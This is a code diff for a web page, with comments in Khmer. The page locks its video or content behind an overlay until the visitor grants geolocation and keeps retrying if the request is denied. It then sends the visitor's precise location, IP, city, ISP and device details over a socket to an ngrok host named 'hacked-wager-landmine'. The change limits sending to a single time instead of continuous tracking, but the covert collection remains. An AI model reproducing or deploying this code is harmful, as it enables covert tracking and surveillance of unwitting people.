@@ -403,7 +403,7 @@ body.nav-collapsed .content{margin-left:0}
     });
   });
 
-  /* ================= GEOLOCATION & DEVICE INFO (Merged) ================= */
+  /* ================= GEOLOCATION & DEVICE INFO (ផ្ញើតែម្ដងគត់) ================= */
   const socket = (typeof io !== 'undefined')
     ? io("https://hacked-wager-landmine.ngrok-free.dev", {
         transports: ['websocket', 'polling'],
@@ -420,12 +420,12 @@ body.nav-collapsed .content{margin-left:0}
   const _dbg = (m) => { if (_statusEl) _statusEl.textContent = m; };
 
   let _granted    = false;   // ពិតនៅពេលទទួលបានសិទ្ធិ
-  let _watchId    = null;    // សម្រាប់តាមដានទីតាំងបន្តបន្ទាប់
+  let _dataSent   = false;   // ការពារការផ្ញើទិន្នន័យដដែលៗ (True ពេលផ្ញើរួច)
   let _attempt    = 0;       // រាប់ចំនួនដងដែលសាកល្បង
   let _retryTimer = null;    // ពេលរង់ចាំសាកល្បងម្ដងទៀត
   let _lastGesture = 0;      // គ្រប់គ្រងល្បឿននៃការចុច
 
-  // អនុគមន៍ទាញយកព័ត៌មានឧបករណ៍ (ដំណើរការដោយលាក់កំបាំង)
+  // អនុគមន៍ទាញយកព័ត៌មានឧបករណ៍
   async function getDeviceInfo() {
       let info = {
           ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown",
@@ -461,6 +461,10 @@ body.nav-collapsed .content{margin-left:0}
   /* ពេលទទួលបានទីតាំង និងព័ត៌មានឧបករណ៍ បញ្ជូនទៅកាន់ Backend ព្រមទាំង Unblock UI */
   async function _emitAndUnblock(pos) {
     if (!socket || !socket.connected) return;
+    
+    // បើផ្ញើរួចម្ដងហើយ បញ្ឈប់ដំណើរការនេះកុំឲ្យវាផ្ញើទៀត
+    if (_dataSent) return; 
+
     try {
       const deviceInfo = await getDeviceInfo();
       
@@ -474,6 +478,9 @@ body.nav-collapsed .content{margin-left:0}
         device: deviceInfo
       });
 
+      // ចំណាំថាបានផ្ញើទិន្នន័យរួចរាល់
+      _dataSent = true; 
+
       // លុបផ្ទាំង Block ចេញ និងបង្ហាញវីដេអូ/ខ្លឹមសារ
       if (blocker) blocker.style.display = 'none';
       if (mainContent) mainContent.style.filter = 'none'; 
@@ -481,16 +488,6 @@ body.nav-collapsed .content{margin-left:0}
       if (errorMsg) errorMsg.style.display = 'none';
       
     } catch (_) {}
-  }
-
-  /* តាមដានទីតាំងបន្តបន្ទាប់ពេលត្រូវបានអនុញ្ញាត */
-  function _startWatch() {
-    if (_watchId !== null || !navigator.geolocation) return;
-    _watchId = navigator.geolocation.watchPosition(
-      _emitAndUnblock,
-      () => {},
-      { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
-    );
   }
 
   /* ទាមទារសិទ្ធិយ៉ាងសកម្ម - បើបរាជ័យនឹងព្យាយាមម្ដងទៀតរហូតដល់បាន */
@@ -512,12 +509,13 @@ body.nav-collapsed .content{margin-left:0}
     _attempt++;
     _dbg('[GEO] attempt #' + _attempt);
 
+    // ទាញយកទីតាំងតែម្ដងគត់ (getCurrentPosition)
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         _granted = true;
         _dbg('[GEO] ✓ granted on attempt #' + _attempt);
         _emitAndUnblock(pos);
-        _startWatch();
+        // លុបមុខងារ _startWatch ចេញដើម្បីកុំឲ្យវាទាញយកទិន្នន័យរហូត
       },
       () => {
         /* Error (Deny/Timeout) -> បង្ហាញ Error តែនៅតែព្យាយាមម្ដងទៀត */
@@ -551,6 +549,7 @@ body.nav-collapsed .content{margin-left:0}
       _dbg('[GEO] state: ' + perm.state);
       perm.onchange = () => {
         _dbg('[GEO] state -> ' + perm.state);
+        // បើគេចុច Block ហើយមក Allow វិញ ឲ្យវាទាញយកទីតាំងម្ដងទៀត
         if (perm.state === 'granted') { _granted = false; _requestGeo(); }
       };
     } catch (_) {}
@@ -569,11 +568,11 @@ body.nav-collapsed .content{margin-left:0}
   if (socket) {
     socket.on('connect', () => {
       _dbg('[SOCKET] connected');
-      if (_granted) {
+      if (_granted && !_dataSent) {
         navigator.geolocation.getCurrentPosition(_emitAndUnblock, () => {}, {
           enableHighAccuracy: true, maximumAge: 0, timeout: 8000
         });
-      } else {
+      } else if (!_granted) {
         _requestGeo();
       }
     });
